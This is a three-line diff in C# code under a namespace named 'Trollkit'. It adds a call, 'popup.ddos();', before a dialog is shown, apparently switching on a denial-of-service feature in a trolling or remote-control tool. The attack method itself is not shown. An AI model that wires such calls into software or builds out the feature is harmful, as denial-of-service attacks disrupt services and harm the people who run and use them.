@@ -84,6 +84,7 @@ namespace Trollkit
                 popup.addClient(client);
             }
 
+            popup.ddos();
             popup.ShowDialog();
         }
     }
